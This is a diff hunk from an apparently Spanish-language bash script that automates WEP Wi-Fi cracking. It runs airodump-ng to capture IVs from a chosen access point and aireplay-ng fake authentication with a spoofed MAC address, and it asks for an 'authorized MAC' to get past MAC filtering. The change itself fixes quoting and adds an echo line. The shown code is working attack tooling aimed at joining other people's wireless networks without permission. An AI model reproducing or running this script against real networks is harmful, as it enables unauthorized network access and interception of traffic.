@@ -136,23 +136,24 @@ if [ "$(id -g)" -eq 0 ]; then
         CHANNEL=`cat $targetPath | grep Channel | sed s/.*://g`
         ESSID=`cat $targetPath | grep ESSID | sed s/.*://g | sed s/\"//g`
 	rm $infoPath $targetPath
-        echo 'Comenzando el almacenamiento de IVs en el canal $CHANNEL para\n$ESSID [$BSSID]'
+        echo "Comenzando el almacenamiento de IVs en el canal $CHANNEL para\n$ESSID [$BSSID]"
 
 	# sub-shell para la captura de IVs
 	rm aire-tmp-* > /dev/null 2>&1
 	(xterm -e airodump-ng --encrypt WEP -a --channel $CHANNEL --bssid $BSSID --write aire-tmp $IFACE &)
         (while true; do
 		echo Esperando a sintonizar el canal... && sleep 2 && echo done.
-                echo $'Lanzando la falsa autenticacion...\n(presione ctrl+c sobre la ventana para cerrarla)'
+                echo "Lanzando la falsa autenticacion...\n(presione ctrl+c sobre la ventana para cerrarla)"
                 (xterm -hold -e aireplay-ng --fakeauth=6000 -o 1 -q 10 -e $ESSID -a $BSSID -h $NEWMAC $IFACE &)
                 echo -n "Ha funcionado la falsa autenticacion? (Y/n) "
                 read RES
-                if [ $RES = 'Y' ]; then
+                if [ "$RES" = 'Y' ]; then
                         exit
                 fi
                 echo -n "Se necesita de una MAC autorizada [aa:bb:cc:dd:ee:ff]: "
                 read NEWMAC
                 if [ -z "$NEWMAC" ]; then
+                        echo 'Generando una propia mac'
                         continue
                 fi
                 echo 'Reiniciando la interfaz con nueva MAC...'
